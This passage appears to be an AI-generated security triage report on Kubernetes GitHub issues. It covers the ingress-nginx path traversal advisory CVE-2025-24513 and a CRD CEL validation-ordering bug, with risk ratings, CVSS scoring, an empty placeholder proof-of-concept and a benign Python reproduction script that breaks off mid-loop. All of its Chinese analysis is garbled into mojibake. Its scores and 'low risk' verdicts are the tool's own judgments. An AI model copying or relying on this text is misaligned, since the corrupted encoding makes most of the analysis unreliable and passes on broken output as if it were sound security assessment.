print("é£é™©åˆ†æï¼šä½é£é™©ä¿¡æ¯æ³„éœ²ï¼ˆé™ˆæ—§æ•°æ®ï¼‰ï¼Œåˆ©ç”¨æ¡ä»¶å¤æ‚ï¼ŒCVSS 3.1ã€‚")

# æ¨¡æ‹Ÿé€€å‡º
time.sleep(1)
sys.exit(0)
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Python è„šæœ¬å¹¶æœªå®é™…æ‰§è¡Œå¤ç°æ“ä½œã€‚æ ¹æ®ç”¨æˆ·è®¾å®šçš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œåªæœ‰è¢«è¯„å®šä¸ºâ€œé«˜é£é™©â€çš„ Issue æ‰éœ€è¦æä¾›è¯¦ç»†çš„å¤ç°è„šæœ¬ (POC)ã€‚

åœ¨æ­¤æ¡ˆä¾‹ä¸­ï¼Œåˆ†æç»“è®ºæ˜¯è¯¥ Issueï¼ˆåœ¨ç‰¹å®šæ¡ä»¶ä¸‹é€šè¿‡æ—§ API ç‰ˆæœ¬å’Œ `resourceVersion` è·å–å·²åˆ é™¤ CR å¯¹è±¡ï¼‰æ„æˆäº†ä¸€ä¸ªâ€œä½é£é™©â€çš„ä¿¡æ¯æ³„éœ²é—®é¢˜ã€‚å…¶ CVSS 3.1 è¯„åˆ†ä¸º 3.1ï¼Œä½äºé«˜é£é™©é˜ˆå€¼ï¼ˆé€šå¸¸ä¸º 7.0 æˆ–æ›´é«˜ï¼‰ã€‚è¯¥é—®é¢˜ä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€æƒé™æå‡ã€å®¹å™¨é€ƒé€¸æˆ–ä¸¥é‡çš„å¤šç§Ÿæˆ·éš”ç¦»ç ´åã€‚

å› æ­¤ï¼Œè„šæœ¬ä»…æ‰“å°äº†é£é™©è¯„çº§ç»“è®ºå’Œä¸æä¾› POC çš„åŸå› ï¼Œå¹¶æ­£å¸¸é€€å‡ºï¼Œç¬¦åˆä¸å¯¹ä½é£é™©é—®é¢˜ç”Ÿæˆå®é™…å¤ç°ä»£ç çš„è¦æ±‚ã€‚

---


## Issue #131005 CVE-2025-24513: ingress-nginx controller - auth secret file path traversal vulnerability

- Issue é“¾æ¥ï¼š[#131005](https://github.com/kubernetes/kubernetes/issues/131005)

### Issue å†…å®¹

CVSS Rating: [CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:L](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:L)) (Score: 4.8, Medium)

A security issue was discovered in [ingress-nginx](https://github.com/kubernetes/ingress-nginx) where attacker-provided data are included in a filename by the ingress-nginx Admission Controller feature, resulting in directory traversal within the container. This could result in denial of service, or when combined with other vulnerabilities, limited disclosure of Secret objects from the cluster. 

#### Am I vulnerable?

This issue affects ingress-nginx. If you do not have ingress-nginx installed on your cluster, you are not affected. You can check this by running \`kubectl get pods \--all-namespaces \--selector app.kubernetes.io/name=ingress-nginx\`.

##### Affected Versions

- < v1.11.0
- v1.11.0 \- 1.11.4  
- v1.12.0

#### How do I mitigate this vulnerability?

**ACTION REQUIRED:** The following steps must be taken to mitigate this vulnerability: Upgrade ingress-nginx to v1.11.5, v1.12.1, or any later version.

Before applying the patch, this issue can be mitigated by disabling the Validating Admission Controller functionality of ingress-nginx.  

##### Fixed Versions

- ingress-nginx [main@cbc1590](https://github.com/kubernetes/ingress-nginx/pull/13068/commits/cbc159094f6d1b1bf8cf1761eb119138d1f95df1)

To upgrade, refer to the documentation: [Upgrading Ingress-nginx](https://kubernetes.github.io/ingress-nginx/deploy/upgrade/)

#### Detection

There are no known indicators of compromise that prove this vulnerability has been exploited.

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

##### Acknowledgements

This vulnerability was reported by Nir Ohfeld and Ronen Shustin from Wiz

The issue was fixed and coordinated by Marco Ebert, James Strong, Tabitha Sable, and the Kubernetes Security Response Committee

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **æ¼æ´æ€§è´¨åˆ†æ**ï¼šè¯¥ Issue æè¿°äº†ä¸€ä¸ªå·²ç¡®è®¤çš„å®‰å…¨æ¼æ´ CVE-2025-24513ï¼Œå±äºè·¯å¾„éå†ï¼ˆPath Traversalï¼‰ç±»å‹ï¼Œå‘ç”Ÿåœ¨ Kubernetes çš„ ingress-nginx é¡¹ç›®çš„ Admission Controller ç»„ä»¶ä¸­ã€‚
2.  **å½±å“åˆ†æ**ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹å®šçš„æ•°æ®ï¼ˆåŒ…å«åœ¨è¢« Admission Controller å¤„ç†çš„æ–‡ä»¶åä¸­ï¼‰æ¥è§¦å‘æ­¤æ¼æ´ï¼Œå®ç°åœ¨ Admission Controller è¿è¡Œçš„å®¹å™¨å†…éƒ¨è¿›è¡Œç›®å½•éå†ã€‚å…¶ç›´æ¥åæœè¢«æè¿°ä¸ºå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ï¼Œæˆ–è€…åœ¨ä¸å…¶ä»–æ¼æ´ç»“åˆçš„æƒ…å†µä¸‹ï¼Œå¯èƒ½æœ‰é™åœ°æ³„éœ²é›†ç¾¤ä¸­çš„ Secret å¯¹è±¡ï¼ˆä»…é™äºè¯¥ Controller Pod æœ‰æƒè®¿é—®çš„ Secretï¼‰ã€‚
3.  **è§¦å‘æ¡ä»¶åˆ†æ**ï¼šæ¼æ´å‘ç”Ÿåœ¨ Admission Controller å¤„ç†æ•°æ®æ—¶ã€‚Admission Controller é€šå¸¸ç”¨äºéªŒè¯æˆ–ä¿®æ”¹ Kubernetes èµ„æºçš„åˆ›å»º/æ›´æ–°è¯·æ±‚ï¼ˆä¾‹å¦‚ Ingress å¯¹è±¡ï¼‰ã€‚å› æ­¤ï¼Œæ”»å‡»è€…éœ€è¦æœ‰æƒé™æ‰§è¡Œèƒ½å¤Ÿè§¦å‘è¯¥ Admission Controller çš„æ“ä½œï¼Œä¾‹å¦‚åˆ›å»ºæˆ–æ›´æ–°ä¸€ä¸ª Ingress èµ„æºã€‚
4.  **CVSS è¯„åˆ†åˆ†æ**ï¼šIssue ä¸­æ˜ç¡®ç»™å‡ºäº† CVSS 3.1 è¯„åˆ†ä¸º 4.8 (Medium)ï¼Œå‘é‡ä¸º `AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:L`ã€‚è¿™ä¸ªè¯„åˆ†è¡¨æ˜ï¼š
    *   `AV:N` (ç½‘ç»œæ”»å‡»)ï¼šæ¼æ´å¯ä»¥è¿œç¨‹åˆ©ç”¨ã€‚
    *   `AC:H` (æ”»å‡»å¤æ‚åº¦é«˜)ï¼šåˆ©ç”¨è¯¥æ¼æ´æ¯”è¾ƒå›°éš¾ã€‚
    *   `PR:N` (æ— éœ€æƒé™)ï¼šåˆ©ç”¨æ¼æ´æœ¬èº«ä¸éœ€è¦ç‰¹å®šæƒé™ï¼Œä½†å¦‚ä¸Šæ‰€è¿°ï¼Œè§¦å‘ Admission Controller çš„æ“ä½œï¼ˆå¦‚åˆ›å»º/æ›´æ–° Ingressï¼‰é€šå¸¸éœ€è¦ Kubernetes RBAC æƒé™ã€‚
    *   `C:L` (ä½æœºå¯†æ€§å½±å“)ï¼šå¯èƒ½å¯¼è‡´å°‘é‡ä¿¡æ¯æ³„éœ²ã€‚
    *   `I:N` (æ— å®Œæ•´æ€§å½±å“)ã€‚
    *   `A:L` (ä½å¯ç”¨æ€§å½±å“)ï¼šå¯èƒ½å¯¼è‡´ DoSã€‚
5.  **é£é™©åˆ¤æ–­æ ‡å‡†åº”ç”¨**ï¼š
    *   **æ ‡å‡† 2 & 3**ï¼šè¿™æ˜¯ä¸€ä¸ªå®‰å…¨é—®é¢˜ï¼Œä½†å…¶ CVSS è¯„åˆ†ä¸º 4.8 (Medium)ï¼Œä½äºé€šå¸¸å®šä¹‰çš„é«˜é£é™©é˜ˆå€¼ï¼ˆä¾‹å¦‚ CVSS High é€šå¸¸ä¸º 7.0 æˆ–æ›´é«˜ï¼‰ã€‚å› æ­¤ï¼Œåˆæ­¥åˆ¤æ–­ä¸ºä½é£é™©ã€‚
    *   **æ ‡å‡† 5**ï¼šæ¼æ´å¯èƒ½å¯¼è‡´ DoSï¼Œä½†è§¦å‘è¯¥ DoS çš„å‰ææ˜¯æ”»å‡»è€…éœ€è¦å…·å¤‡åˆ›å»ºæˆ–ä¿®æ”¹ç›¸å…³ Kubernetes èµ„æºï¼ˆå¦‚ Ingressï¼‰çš„æƒé™ã€‚æ ¹æ®æ­¤æ ‡å‡†ï¼Œå½“ DoS æ”»å‡»éœ€è¦éåªè¯»æƒé™æ—¶ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚è¿™è¿›ä¸€æ­¥æ”¯æŒäº†ä½é£é™©çš„åˆ¤æ–­ã€‚
    *   **æ ‡å‡† 7**ï¼šIssue æè¿°æœªæåŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸æˆ–æƒé™æå‡ç­‰é«˜å±åæœã€‚è·¯å¾„éå†è¢«é™åˆ¶åœ¨ Admission Controller çš„å®¹å™¨å†…ï¼Œå…¶ç›´æ¥å½±å“ç›¸å¯¹æœ‰é™ã€‚
    *   **æ ‡å‡† 8**ï¼šè™½ç„¶ Admission Controller æ˜¯ä¸€ä¸ªä¸­å¿ƒç»„ä»¶ï¼Œä½†æè¿°çš„ç›´æ¥å½±å“ï¼ˆDoS æˆ–æœ‰é™ä¿¡æ¯æ³„éœ²ï¼‰ä¸»è¦é’ˆå¯¹ Controller æœ¬èº«åŠå…¶å¯è®¿é—®çš„æ•°æ®ï¼Œå¹¶æœªç›´æ¥æè¿°ä½æƒé™ç”¨æˆ·èƒ½å¤Ÿå½±å“å…¶ä»–ç”¨æˆ·å·¥ä½œè´Ÿè½½æˆ–å®¹å™¨çš„æƒ…å†µã€‚
    *   **æ ‡å‡† 9**ï¼šIssue æä¾›çš„ä¿¡æ¯ï¼ˆåŒ…æ‹¬ CVSS è¯„åˆ†å’Œå½±å“æè¿°ï¼‰ç›¸å¯¹å……åˆ†ï¼Œè¶³ä»¥åˆ¤æ–­é£é™©ç­‰çº§ã€‚

6.  **ç»“è®º**ï¼šç»¼åˆæ¥çœ‹ï¼Œè¯¥æ¼æ´è™½ç„¶æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„å®‰å…¨é—®é¢˜ï¼Œä½†å…¶åˆ©ç”¨å¤æ‚åº¦è¾ƒé«˜ï¼Œç›´æ¥å½±å“æœ‰é™ï¼ˆDoS æˆ–æœ‰é™ä¿¡æ¯æ³„éœ²ï¼‰ï¼Œä¸”è§¦å‘æ¡ä»¶éœ€è¦ä¸€å®šçš„ Kubernetes æƒé™ã€‚æ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†å’Œ CVSS è¯„åˆ†ï¼Œåº”å°†å…¶è¯„å®šä¸ºä½é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤ Issue è¢«è¯„å®šä¸ºä½é£é™©ï¼Œå› æ­¤ä¸æä¾›å¤ç° POC è„šæœ¬ã€‚
# ä½é£é™©åˆ¤æ–­ä¾æ®ï¼š
# 1. å®˜æ–¹ CVSS è¯„åˆ†ä¸º 4.8 (Medium)ï¼Œä½äºé«˜é£é™©é˜ˆå€¼ã€‚
# 2. æ¼æ´å½±å“ä¸»è¦æ˜¯å®¹å™¨å†…çš„è·¯å¾„éå†ï¼Œå¯¼è‡´æ½œåœ¨çš„ DoS æˆ–æœ‰é™çš„ä¿¡æ¯æ³„éœ²ï¼Œæœªè¾¾åˆ°å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ç­‰çº§åˆ«ã€‚
# 3. åˆ©ç”¨æ¼æ´å¯èƒ½éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»º/æ›´æ–° Kubernetes èµ„æºï¼ˆå¦‚ Ingressï¼‰çš„æƒé™ï¼Œæ ¹æ®æ ‡å‡† 5ï¼Œéœ€è¦æƒé™çš„ DoS æ”»å‡»ä¸åº”åˆ¤å®šä¸ºé«˜é£é™©ã€‚
pass
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Python è„šæœ¬ä¸ºç©ºå®ç° (`pass`)ï¼Œå› ä¸ºæ ¹æ®åˆ†æï¼ŒIssue CVE-2025-24513 è¢«è¯„å®šä¸º**ä½é£é™©**ã€‚é£é™©è¯„çº§çš„ä¾æ®æ˜¯å®˜æ–¹æä¾›çš„ CVSS è¯„åˆ†ä¸º 4.8 (Medium)ï¼Œå…¶å½±å“è¢«é™åˆ¶åœ¨ Admission Controller å®¹å™¨å†…çš„è·¯å¾„éå†ï¼Œå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡æˆ–æœ‰é™çš„ Secret æ³„éœ²ï¼Œå¹¶æœªæ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ç­‰é«˜å±åœºæ™¯ã€‚æ­¤å¤–ï¼Œæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡† #5ï¼Œç”±äºæ½œåœ¨çš„ DoS æ”»å‡»éœ€è¦æ”»å‡»è€…æ‹¥æœ‰åˆ›å»º/æ›´æ–° Kubernetes èµ„æºçš„æƒé™ï¼Œè¿™è¿›ä¸€æ­¥é™ä½äº†å…¶é£é™©è¯„çº§ï¼Œä¸ç¬¦åˆé«˜é£é™©çš„æ ‡å‡†ã€‚æŒ‰ç…§è¦æ±‚ï¼Œä»…é’ˆå¯¹é«˜é£é™©é—®é¢˜æä¾›å¤ç°è„šæœ¬ï¼Œå› æ­¤æ­¤å¤„ä¸æä¾›å…·ä½“ POC ä»£ç ã€‚

---


## Issue #130984 CRD CEL validation is executed in non-deterministic order

- Issue é“¾æ¥ï¼š[#130984](https://github.com/kubernetes/kubernetes/issues/130984)

### Issue å†…å®¹

#### What happened?

We noticed that if there are CEL validations on multiple properties of a CRD the execution order is not deterministic.

We noticed this because our unit tests were failing because of the changing validation messages (xref: [CAPI#11874](https://github.com/kubernetes-sigs/cluster-api/pull/11874), [ProwJob](https://prow.k8s.io/view/gs/kubernetes-ci-logs/pr-logs/pull/kubernetes-sigs_cluster-api/11835/pull-cluster-api-test-main/1891887690366849024)).

I think the reason is that we are iterating over a map here without any sorting of the map keys: [https://github.com/kubernetes/kubernetes/blob/5420b2fe9a84af57cc24793c8f8ac8821b65[â€¦]/apiextensions-apiserver/pkg/apiserver/schema/cel/validation.go](https://github.com/kubernetes/kubernetes/blob/5420b2fe9a84af57cc24793c8f8ac8821b65f42f/staging/src/k8s.io/apiextensions-apiserver/pkg/apiserver/schema/cel/validation.go#L833)

Would it make sense to make this more deterministic?

I think the current impact is:
* validation error messages are not deterministic
* if the validation runs out of budget it's random which validations will be executed before the budget runs out

#### What did you expect to happen?

The CEL validation being executed always in the same order. Ideally the order in which the fields are defined in the CRD. But also e.g. using alphabetic order based on the property names would be an improvement.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a CRD with CEL validations on multiple properties of the same parent field (example here: https://github.com/kubernetes-sigs/cluster-api/blob/v1.10.0-beta.0/config/crd/bases/cluster.x-k8s.io_machinedrainrules.yaml#L236-L238)

Deploy a corresponding CR which violates both validations.

Repeat a few times and observe how the validation message is not deterministic



#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.0
Kustomize Version: v5.5.0
Server Version: v1.32.2
```

</details>


#### Cloud provider

<details>
kind - no cloud provider
</details>


#### OS version

<details>

Not relevant, but we were hitting this in k8s Prow as well: https://prow.k8s.io/view/gs/kubernetes-ci-logs/pr-logs/pull/kubernetes-sigs_cluster-api/11835/pull-cluster-api-test-main/1891887690366849024

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **Issueæè¿°**: è¯¥IssueæŒ‡å‡ºKubernetes CRDï¼ˆCustom Resource Definitionï¼‰çš„CELï¼ˆCommon Expression Languageï¼‰éªŒè¯è§„åˆ™åœ¨åº”ç”¨äºåŒä¸€çˆ¶å­—æ®µä¸‹çš„å¤šä¸ªå±æ€§æ—¶ï¼Œå…¶æ‰§è¡Œé¡ºåºæ˜¯ä¸ç¡®å®šçš„ã€‚è¿™æ˜¯å› ä¸ºåº•å±‚å®ç°ï¼ˆ`validation.go#L833`ï¼‰åœ¨å¤„ç†éªŒè¯è§„åˆ™æ—¶è¿­ä»£äº†ä¸€ä¸ªGoè¯­è¨€çš„mapï¼Œè€Œmapçš„è¿­ä»£é¡ºåºåœ¨Goä¸­æ˜¯éšæœºçš„ã€‚
2.  **ä¸»è¦å½±å“**:
    *   **éªŒè¯é”™è¯¯ä¿¡æ¯ä¸ç¡®å®š**: å½“ä¸€ä¸ªCRï¼ˆCustom Resourceï¼‰å®ä¾‹åŒæ—¶è¿åå¤šä¸ªéªŒè¯è§„åˆ™æ—¶ï¼ŒAPI Serverè¿”å›çš„é”™è¯¯ä¿¡æ¯å¯èƒ½ä¼šå› ä¸ºæ¯æ¬¡éªŒè¯çš„æ‰§è¡Œé¡ºåºä¸åŒè€Œä¸åŒã€‚è¿™ä¸»è¦å½±å“äº†ä¾èµ–ç‰¹å®šé”™è¯¯ä¿¡æ¯çš„è‡ªåŠ¨åŒ–æµ‹è¯•ï¼ˆå¦‚Issueä¸­æåˆ°çš„å•å…ƒæµ‹è¯•å¤±è´¥ï¼‰å’Œç”¨æˆ·è°ƒè¯•ä½“éªŒã€‚
    *   **éªŒè¯é¢„ç®—è€—å°½æ—¶çš„éšæœºæ€§**: CELéªŒè¯æœ‰è®¡ç®—æˆæœ¬é¢„ç®—é™åˆ¶ã€‚å¦‚æœä¸€ä¸ªCRéå¸¸å¤æ‚æˆ–éªŒè¯è§„åˆ™è®¡ç®—é‡å¤§ï¼Œå¯èƒ½åœ¨æ‰€æœ‰è§„åˆ™æ‰§è¡Œå®Œæ¯•å‰å°±è€—å°½é¢„ç®—ã€‚ç”±äºæ‰§è¡Œé¡ºåºä¸ç¡®å®šï¼Œå“ªäº›è§„åˆ™èƒ½å¤ŸæˆåŠŸæ‰§è¡Œã€å“ªäº›å› é¢„ç®—è€—å°½è€Œè¢«è·³è¿‡ï¼Œä¹Ÿå˜å¾—éšæœºã€‚è¿™å¯èƒ½å¯¼è‡´æŸäº›æœ¬åº”è¢«é˜»æ­¢çš„æ— æ•ˆCRåœ¨ç‰¹å®šæƒ…å†µä¸‹ï¼ˆå–å†³äºéšæœºé¡ºåºå’Œé¢„ç®—ï¼‰è¢«æ„å¤–æ¥å—ï¼ˆå¦‚æœæœªæ‰§è¡Œåˆ°å…³é”®çš„å¤±è´¥è§„åˆ™ï¼‰ã€‚
3.  **å®‰å…¨é£é™©è¯„ä¼°**:
    *   **é”™è¯¯ä¿¡æ¯ä¸ç¡®å®šæ€§**: è¿™æœ¬èº«ä¸æ„æˆå®‰å…¨é£é™©ã€‚å®ƒæ˜¯ä¸€ä¸ªå¯ç”¨æ€§å’Œå¯æµ‹è¯•æ€§é—®é¢˜ã€‚
    *   **é¢„ç®—è€—å°½åœºæ™¯**: è¿™å­˜åœ¨æ½œåœ¨çš„ä½åº¦å®Œæ•´æ€§é£é™©ã€‚æ”»å‡»è€…ï¼ˆæ‹¥æœ‰åˆ›å»º/æ›´æ–°ç‰¹å®šCRæƒé™çš„ç”¨æˆ·ï¼‰å¯ä»¥ç²¾å¿ƒæ„é€ ä¸€ä¸ªCRï¼Œä½¿å…¶åŒ…å«å¤šä¸ªï¼ˆå¯èƒ½åŒ…æ‹¬ä¸€ä¸ªå…³é”®çš„ï¼‰è¿åè§„åˆ™çš„å­—æ®µï¼Œå¹¶å°è¯•åˆ©ç”¨éªŒè¯é¢„ç®—å’Œéšæœºæ‰§è¡Œé¡ºåºï¼ŒæœŸæœ›åœ¨å…³é”®éªŒè¯è§„åˆ™æ‰§è¡Œå‰è€—å°½é¢„ç®—ï¼Œä»è€Œç»•è¿‡è¯¥éªŒè¯ã€‚
    *   **æ”»å‡»å‰æ**:
        *   æ”»å‡»è€…éœ€è¦æœ‰åˆ›å»ºæˆ–æ›´æ–°ç›®æ ‡CRDå¯¹åº”CRçš„æƒé™ã€‚
        *   æ”»å‡»è€…éœ€è¦äº†è§£CRDçš„éªŒè¯è§„åˆ™å’ŒCELçš„é¢„ç®—æœºåˆ¶ã€‚
        *   æ”»å‡»è€…éœ€è¦èƒ½å¤Ÿæ„é€ ä¸€ä¸ªæ¥è¿‘é¢„ç®—é™åˆ¶çš„å¤æ‚CRã€‚
        *   æˆåŠŸç»•è¿‡éªŒè¯ä¾èµ–äºéšæœºæ‰§è¡Œé¡ºåºå’Œé¢„ç®—è€—å°½çš„æ—¶æœºï¼Œä¸æ˜¯ç¡®å®šæ€§çš„ã€‚
    *   **CVSS 3.1 è¯„ä¼°**:
        *   AV:N (é€šè¿‡ç½‘ç»œAPIäº¤äº’)
        *   AC:L (æ„é€ CRä¸ç®—ç‰¹åˆ«å¤æ‚ï¼Œä½†éœ€è¦å¯¹è§„åˆ™å’Œé¢„ç®—æœ‰äº†è§£)
        *   PR:L (éœ€è¦åˆ›å»º/æ›´æ–°CRçš„æƒé™ï¼Œè¿™é€šå¸¸ä½äºä¿®æ”¹CRDçš„æƒé™)
        *   UI:N (æ— éœ€ç”¨æˆ·äº¤äº’)
        *   S:U (å½±å“èŒƒå›´é™äºAPI Serverå¯¹è¯¥CRçš„éªŒè¯é€»è¾‘ï¼Œä¸æ”¹å˜å…¶è‡ªèº«æˆ–å…¶ä»–ç»„ä»¶çš„å®‰å…¨èŒƒå›´)
        *   C:N (ä¸æ¶‰åŠæœºå¯†æ€§æ³„éœ²)
        *   I:L (å¯èƒ½åœ¨ç‰¹å®šæ¡ä»¶ä¸‹ç»•è¿‡éªŒè¯ï¼Œå…è®¸ä¸ç¬¦åˆé¢„æœŸçš„CRçŠ¶æ€ï¼Œå½±å“æ•°æ®å®Œæ•´æ€§ï¼Œä½†æˆåŠŸç‡å’Œå½±å“èŒƒå›´æœ‰é™)
        *   A:L (å¯èƒ½å¯¼è‡´API Serveråœ¨å¤„ç†æŸäº›å¤æ‚CRæ—¶æ¶ˆè€—æ›´å¤šèµ„æºæˆ–è¡Œä¸ºä¸ä¸€è‡´ï¼Œå¯¹éªŒè¯æœåŠ¡çš„å¯ç”¨æ€§æœ‰è½»å¾®å½±å“ï¼›å¦‚æœæ— æ•ˆCRè¢«æ¥å—ï¼Œå¯èƒ½å¯¼è‡´åç»­æ§åˆ¶å™¨è¡Œä¸ºå¼‚å¸¸ï¼Œä½†ä¸æ˜¯ç›´æ¥çš„æ‹’ç»æœåŠ¡æ”»å‡»)
        *   **è¯„åˆ†**: 5.4 (Medium)
    *   **é£é™©ç­‰çº§åˆ¤å®š**: æ ¹æ®è§„åˆ™3ï¼ŒCVSSè¯„åˆ†ä¸ºMediumï¼Œå±äº**ä½é£é™©**ã€‚è¯¥é—®é¢˜ä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€ææƒã€å®¹å™¨é€ƒé€¸ç­‰é«˜é£é™©è¡Œä¸ºï¼ˆè§„åˆ™7ï¼‰ã€‚è™½ç„¶æ”»å‡»è€…éœ€è¦åˆ›å»º/ä¿®æ”¹æƒé™ï¼Œä½†æ ¹æ®è§„åˆ™5ï¼Œè¿™æœ¬èº«ä¸ç›´æ¥å¯¼è‡´é™çº§ï¼ˆå› ä¸ºCVSSè¯„åˆ†å·²åœ¨Highä»¥ä¸‹ï¼‰ã€‚è¯¥é—®é¢˜ä¸å½±å“å…¶ä»–ç”¨æˆ·ï¼ˆè§„åˆ™8ï¼‰ã€‚

4.  **ç»“è®º**: è¯¥Issueæè¿°çš„é—®é¢˜ä¸»è¦å½±å“å¼€å‘å’Œæµ‹è¯•çš„ç¡®å®šæ€§ï¼Œä»¥åŠåœ¨é¢„ç®—è€—å°½çš„è¾¹ç¼˜æƒ…å†µä¸‹å­˜åœ¨ä½åº¦çš„å®Œæ•´æ€§é£é™©ï¼ˆéªŒè¯ç»•è¿‡ï¼‰ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè¯¥é—®é¢˜è¯„çº§ä¸ºä½é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import json
import uuid
from kubernetes import client, config
from kubernetes.client.rest import ApiException
import datetime
import sys

# Constants
CRD_GROUP = "example.com"
CRD_VERSION = "v1"
CRD_PLURAL = "mydeterministictests"
NAMESPACE = "default"
MAX_ATTEMPTS = 15 # Number of attempts to create the CR
TIMEOUT_SECONDS = 120 # 2 minutes timeout for the whole script

def create_crd_object():
    """Creates the CRD manifest dictionary"""
    crd_name = f"{CRD_PLURAL}.{CRD_GROUP}"
    return {
        "apiVersion": "apiextensions.k8s.io/v1",
        "kind": "CustomResourceDefinition",
        "metadata": {
            "name": crd_name
        },
        "spec": {
            "group": CRD_GROUP,
            "versions": [
                {
                    "name": CRD_VERSION,
                    "served": True,
                    "storage": True,
                    "schema": {
                        "openAPIV3Schema": {
                            "type": "object",
                            "properties": {
                                "spec": {
                                    "type": "object",
                                    "properties": {
                                        "fieldA": {
                                            "type": "integer",
                                            # Rule 1: fieldA must be > 10
                                            "x-kubernetes-validations": [{
                                                "rule": "self > 10",
                                                "message": "fieldA must be greater than 10"
                                            }]
                                        },
                                        "fieldB": {
                                            "type": "string",
                                            # Rule 2: fieldB must have length < 5
                                            "x-kubernetes-validations": [{
                                                "rule": "self.size() < 5",
                                                "message": "fieldB length must be less than 5"
                                            }]
                                        },
                                        "fieldC": {
                                            "type": "boolean",
                                             # Rule 3: fieldC must be true
                                            "x-kubernetes-validations": [{
                                                "rule": "self == true",
                                                "message": "fieldC must be true"
                                            }]
                                        }
                                    },
                                     # Add object level rule to increase complexity slightly if needed, but property rules are enough
                                     # "x-kubernetes-validations": [{
                                     #     "rule": "has(self.fieldA) && has(self.fieldB)",
                                     #     "message": "Both fieldA and fieldB must be present"
                                     # }]
                                }
                            }
                        }
                    }
                }
            ],
            "scope": "Namespaced",
            "names": {
                "plural": CRD_PLURAL,
                "singular": "mydeterministictest",
                "kind": "MyDeterministicTest",
                "shortNames": ["mdt"]
            }
        }
    }

def create_cr_object(name):
    """Creates the CR manifest dictionary that violates multiple rules"""
    return {
        "apiVersion": f"{CRD_GROUP}/{CRD_VERSION}",
        "kind": "MyDeterministicTest",
        "metadata": {
            "name": name,
            "namespace": NAMESPACE
        },
        "spec": {
            # Violates Rule 1 (should be > 10)
            "fieldA": 5,
            # Violates Rule 2 (length should be < 5)
            "fieldB": "longstringvalue",
            # Violates Rule 3 (should be true)
            "fieldC": False
        }
    }

def main():
    start_time = datetime.datetime.now()
    print("Starting script...")

    try:
        # Load Kubernetes configuration from default location (~/.kube/config)
        config.load_kube_config()
        print("Kubernetes config loaded.")
    except Exception as e:
        print(f"Error loading Kubernetes config: {e}")
        sys.exit(1)

    # Create API clients
    api_extensions_client = client.ApiextensionsV1Api()
    custom_objects_client = client.CustomObjectsApi()

    # Generate a unique name for the CRD based on the plural, group, and a random suffix
    crd_manifest = create_crd_object()
    crd_name = crd_manifest["metadata"]["name"]
    print(f"Using CRD: {crd_name}")

    # --- CRD Creation ---
    try:
        print(f"Attempting to create CRD {crd_name}...")
        api_extensions_client.create_custom_resource_definition(body=crd_manifest)
        print(f"CRD {crd_name} created. Waiting a bit for it to be established...")
        # Wait for the CRD to be established (simple sleep, robust checks are more complex)
        time.sleep(10)
    except ApiException as e:
        if e.status == 409:  # Conflict - CRD already exists
            print(f"CRD {crd_name} already exists. Proceeding...")
        else:
            print(f"Error creating CRD {crd_name}: {e.status} - {e.reason}")
            try:
                error_body = json.loads(e.body)
                print(f"Error details: {json.dumps(error_body, indent=2)}")
            except json.JSONDecodeError:
                print(f"Error body: {e.body}")
            sys.exit(1)
    except Exception as e:
         print(f"An unexpected error occurred during CRD creation: {e}")
         sys.exit(1)


    # --- CR Creation Attempts ---
    observed_error_messages = set()
    cr_name_base = f"test-cr-{uuid.uuid4().hex[:6]}"
    print(f"Attempting to create CR instances violating multiple rules ({MAX_ATTEMPTS} times)...")

    for i in range(MAX_ATTEMPTS):
        # Check for timeout
        elapsed_time = (datetime.datetime.now() - start_time).total_seconds()
        if elapsed_time > TIMEOUT_SECONDS:
            print(f"Timeout reached ({TIMEOUT_SECONDS}s). Exiting loop.")
            break

        cr_name = f"{cr_name_base}-{i}"
        cr_manifest = create_cr_object(cr_name)

        try:
            print(f"Attempt {i+1}/{MAX_ATTEMPTS}: Creating CR {cr_name}...")
            custom_objects_client.create_namespaced_custom_object(
                group=CRD_GROUP,
                version=CRD_VERSION,
                namespace=NAMESPACE,
                plural=CRD_PLURAL,
                body=cr_manifest
            )
            # If creation succeeds unexpectedly, print a message (shouldn't happen)
            print(f"Warning: CR {cr_name} created successfully, expected validation failure.")
        except ApiException as e:
            if e.status == 422: # Unprocessable Entity - Validation Error
                try:
                    error_body = json.loads(e.body)
                    # Extract the primary validation error message(s)
                    # Kubernetes typically returns a Status object with details.causes
                    causes = error_body.get("details", {}).get("causes", [])
                    # Sometimes the main message is enough if causes is simple
                    main_message = error_body.get("message", "Unknown validation error")
